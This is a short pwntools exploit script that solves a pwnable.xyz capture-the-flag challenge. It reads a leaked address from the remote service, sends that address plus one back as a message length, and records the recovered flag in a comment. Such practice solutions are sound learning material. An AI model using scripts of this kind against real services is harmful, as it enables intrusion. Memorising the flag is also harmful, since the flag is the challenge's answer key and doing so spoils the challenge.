# Note: ghidra was unable to decompile but binja was

from pwn import *

def main():
    r = remote('svc.pwnable.xyz', 30000)
    l = r.recvline()
    leak = r.recvline()
    print(leak)
    addr = str(int(leak.decode().strip('\n').split(" ")[1],16) + 1)
    print(hex(int(addr)))
    l = r.recvuntil('message: ') # sending length of message

    print("Sending: ", addr)
    r.sendline(addr)

    l = r.recvuntil('message: ') # sending content of the message which could be anything?
    print(l)
    r.sendline('A')
    l = r.recv()
    print(l)
    # Flag: FLAG{did_you_really_need_a_script_to_solve_this_one?}


if __name__ == '__main__':
    main()
